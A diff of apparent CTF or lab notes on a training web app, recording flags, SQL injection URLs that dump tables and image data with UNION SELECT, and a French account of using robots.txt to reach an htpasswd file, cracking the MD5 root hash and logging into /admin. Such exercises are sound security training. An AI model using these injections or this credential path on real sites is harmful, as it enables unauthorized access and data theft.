@@ -7,6 +7,7 @@ Flag:
 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0
 
 
+______________________________________________________________________________________________________-
 
 
 Redirection vulnerabily:
@@ -16,11 +17,13 @@ Flag:
 b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
 
 
+______________________________________________________________________________________________________-
 
 ?????
 e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c
 
 
+______________________________________________________________________________________________________-
 
 SQLi members:
 print all tables / columns:
@@ -32,3 +35,16 @@ http://10.12.1.130/?page=member&id=1%20or%201=1%20UNION%20select%20table_name,%2
 5ff9d0165b4f92b14994e5c685cdce28
 md5 -> FourtyTwo: -> fortytwo -> sha256:
 5ff9d0165b4f92b14994e5c685cdce28#
+
+______________________________________________________________________________________________________-
+
+Httpaccess / robot.text
+acceder a l url avec la route /robots.txt puis une liste de routes est apparu et j'ai utilisé la route "whatever" qui m'a donné accées au fichier htpasswd dans lequel il y avait un user "root" et un mdp hasher en md5 que j'ai dechiffré et puis je me suis connecté en admin sur le site via la route/admin
+
+d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
+
+______________________________________________________________________________________________________-
+
+-SQLI images:
+http://10.12.1.130/index.php?page=searchimg&id=1%20OR%201=1%20union%20select%20title,comment%20from%20list_images&Submit=Submit#
+d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
